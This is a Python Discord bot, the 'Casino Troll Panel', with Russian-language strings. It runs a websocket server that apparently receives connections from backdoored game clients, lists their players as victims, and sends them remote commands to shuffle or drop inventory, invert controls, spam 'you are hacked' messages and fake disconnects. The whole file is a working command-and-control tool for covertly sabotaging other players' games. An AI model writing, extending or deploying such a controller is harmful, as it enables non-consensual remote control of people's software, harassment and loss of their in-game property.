import os
import asyncio
import json
import discord
from discord.ext import commands
import websockets
from websockets.asyncio.server import serve

BOT_TOKEN = os.environ.get("BOT_TOKEN")
TROLL_CHANNEL_ID = 1515619222842114158  # ID канала куда бот пришлёт панель
WS_PORT = 8765

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

connected_players: dict[str, websockets.asyncio.server.ServerConnection] = {}
troll_message: discord.Message = None


def make_embed(players: list[str]) -> discord.Embed:
    embed = discord.Embed(title="🎰 Casino Troll Panel", color=0xFF4444)
    if players:
        embed.add_field(name="🟢 Онлайн", value="\n".join(f"• `{p}`" for p in players), inline=False)
    else:
        embed.add_field(name="🔴 Онлайн", value="Никого нет", inline=False)
    embed.set_footer(text="Выбери игрока и нажми кнопку")
    return embed


class PlayerSelect(discord.ui.Select):
    def __init__(self):
        players = list(connected_players.keys())
        options = [discord.SelectOption(label=p, value=p) for p in players] if players else [
            discord.SelectOption(label="Никого нет", value="none")
        ]
        super().__init__(placeholder="Выбери жертву...", options=options)

    async def callback(self, interaction: discord.Interaction):
        bot.selected_player = self.values[0]
        await interaction.response.send_message(f"✅ Выбран: `{self.values[0]}`", ephemeral=True)


class TrollView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(PlayerSelect())

    async def send_cmd(self, interaction: discord.Interaction, cmd: str, label: str):
        player = getattr(bot, "selected_player", None)
        if not player or player not in connected_players:
            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True)
            return
        try:
            await connected_players[player].send(cmd)
            await interaction.response.send_message(f"✅ `{label}` → `{player}`", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)

    @discord.ui.button(label="🔀 Перемешать инвентарь", style=discord.ButtonStyle.danger, row=1)
    async def shuffle(self, interaction, button):
        await self.send_cmd(interaction, "shuffle", "Инвентарь перемешан")

    @discord.ui.button(label="🎮 Инвертировать WASD", style=discord.ButtonStyle.danger, row=1)
    async def invert(self, interaction, button):
        await self.send_cmd(interaction, "invert", "WASD инвертирован на 30с")

    @discord.ui.button(label="♻️ Вернуть управление", style=discord.ButtonStyle.secondary, row=1)
    async def restore(self, interaction, button):
        await self.send_cmd(interaction, "restore", "Управление восстановлено")

    @discord.ui.button(label="💬 Спам на экране", style=discord.ButtonStyle.primary, row=2)
    async def spam(self, interaction, button):
        await self.send_cmd(interaction, "spam:ТЫ ВЗЛОМАН 😈", "Спам запущен")

    @discord.ui.button(label="📦 Выбросить предметы", style=discord.ButtonStyle.danger, row=2)
    async def drop(self, interaction, button):
        await self.send_cmd(interaction, "drop", "Предметы выброшены")

    @discord.ui.button(label="📡 Фейк-дисконнект", style=discord.ButtonStyle.secondary, row=2)
    async def fakedisco(self, interaction, button):
        await self.send_cmd(interaction, "fakedisco", "Фейк-дисконнект")

    @discord.ui.button(label="🔄 Обновить список", style=discord.ButtonStyle.success, row=3)
    async def refresh(self, interaction, button):
        await interaction.response.edit_message(
            embed=make_embed(list(connected_players.keys())),
            view=TrollView()
        )


async def update_panel():
    global troll_message
    if troll_message:
        try:
            await troll_message.edit(
                embed=make_embed(list(connected_players.keys())),
                view=TrollView()
            )
        except:
            pass


async def ws_handler(ws):
    nick = None
    try:
        async for raw in ws:
            data = json.loads(raw)
            if data.get("type") == "hello":
                nick = data["nick"]
                connected_players[nick] = ws
                print(f"[WS] Подключился: {nick}")
                await update_panel()
    except Exception as e:
        print(f"[WS] Ошибка: {e}")
    finally:
        if nick and nick in connected_players:
            del connected_players[nick]
            print(f"[WS] Отключился: {nick}")
            await update_panel()


async def start_ws_server():
    async with serve(ws_handler, "0.0.0.0", WS_PORT) as server:
        print(f"[WS] Сервер запущен на порту {WS_PORT}")
        await server.serve_forever()


@bot.event
async def on_ready():
    global troll_message
    print(f"[Bot] Запущен как {bot.user}")

    channel = bot.get_channel(TROLL_CHANNEL_ID)
    if channel:
        troll_message = await channel.send(embed=make_embed([]), view=TrollView())

    asyncio.create_task(start_ws_server())


bot.selected_player = None
bot.run(BOT_TOKEN)
